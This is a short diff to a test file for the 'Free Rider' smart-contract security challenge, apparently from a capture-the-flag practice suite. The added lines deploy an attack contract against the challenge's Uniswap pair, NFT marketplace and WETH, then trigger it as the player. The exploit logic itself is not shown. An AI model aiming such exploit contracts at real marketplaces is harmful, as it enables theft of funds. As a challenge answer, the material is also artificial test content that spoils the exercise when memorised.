@@ -106,6 +106,13 @@ describe('[Challenge] Free Rider', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const attack = await (await ethers.getContractFactory('FreeRiderAttack')).deploy(
+            uniswapPair.address,
+            marketplace.address,
+            devsContract.address,
+            weth.address
+        );
+        await attack.connect(player).attack();
     });
 
     after(async function () {
